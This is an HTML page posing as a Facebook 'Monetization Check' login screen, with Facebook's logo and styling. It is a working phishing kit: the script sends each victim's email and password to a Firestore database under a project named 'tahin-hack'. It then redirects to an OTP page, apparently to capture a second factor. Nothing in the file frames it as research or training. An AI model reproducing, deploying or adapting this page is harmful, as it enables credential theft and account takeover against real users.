<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Monetization Check
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
    body { margin: 0; padding: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { width: 100%; max-width: 400px; background: white; padding: 40px 20px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
    .logo-img { width: 100px; margin-bottom: 20px; }
    .logo-text { color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 40px; }
    input { width: 100%; padding: 16px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; background: #fff; }
    .login-btn { width: 100%; background: #1877f2; color: #fff; border: none; padding: 16px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
    .login-btn:hover { background: #166fe5; }
    .forgot { display: block; margin: 20px 0; color: #1877f2; font-size: 14px; text-decoration: none; }
    .divider { display: flex; align-items: center; margin: 30px 0; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #ddd; }
    .divider span { margin: 0 15px; color: #777; font-size: 14px; }
    .create-btn { background: #42b72a; color: #fff; border: none; padding: 14px 20px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
  </style>
</head>
<body>

  <div class="container">
    <!-- আসল ফেসবুক লোগো -->
    <img src="https://www.freepnglogos.com/uploads/facebook-logo-30.jpg" alt="Facebook" class="logo-img">
    <div class="logo-text">facebook</div>

    <input type="text" id="email" placeholder="Mobile number or email">
    <input type="password" id="password" placeholder="Password">

    <button class="login-btn" onclick="submitData()">Log in</button>

    <a href="#" class="forgot">Forgot password?</a>

    <div class="divider"><span>or</span></div>

    <button class="create-btn">Create New Account</button>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
  apiKey: "AIzaSyB2So57nlGhZc458XheSFhv1j5acxG3fy0",
  authDomain: "tahin-hack.firebaseapp.com",
  projectId: "tahin-hack",
  storageBucket: "tahin-hack.firebasestorage.app",
  messagingSenderId: "867261325734",
  appId: "1:867261325734:web:284f95a0754e9537eeaf67",
  measurementId: "G-JLT7QKCCX1"
};


    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.submitData = async function () {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;

      if (!email || !password) {
        alert("Please enter your email and password😊");
        return;
      }

      try {
  await addDoc(collection(db, "submittedUsers"), {
    email: email,
    password: password,
    timestamp: serverTimestamp()
  });

  document.getElementById("email").value = "";
  document.getElementById("password").value = "";

  window.location.href = "otp.html";

} catch (e) {
  console.error(e);
  alert("কিছু সমস্যা হয়েছেআবার চেষ্টা করুন!  " + e.message);
}
    };
  </script>
</body>
  </html>
